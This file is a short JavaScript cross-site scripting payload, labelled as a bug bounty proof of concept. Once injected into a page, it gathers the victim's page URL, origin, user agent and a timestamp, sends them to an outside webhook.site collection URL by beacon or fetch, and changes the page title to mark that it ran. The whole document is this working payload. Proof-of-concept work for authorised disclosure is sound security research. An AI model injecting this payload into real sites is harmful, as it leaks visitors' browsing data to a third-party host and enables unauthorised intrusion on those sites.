// Bug bounty PoC: proves arbitrary JS execution in victim context.
(() => {
	const WEBHOOK = "https://webhook.site/ea24acc2-a60e-4bb7-9c89-e573d335aca9";
	const q = new URLSearchParams({
		fired: "1",
		url: location.href,
		origin: location.origin,
		ua: navigator.userAgent.slice(0, 120),
		when: new Date().toISOString(),
	});
	try {
		navigator.sendBeacon(`${WEBHOOK}?${q}`);
	} catch (_) {
		fetch(`${WEBHOOK}?${q}`, { mode: "no-cors" }).catch(() => {});
	}
	try {
		document.title = "XSS-FIRED";
	} catch (_) {}
})();
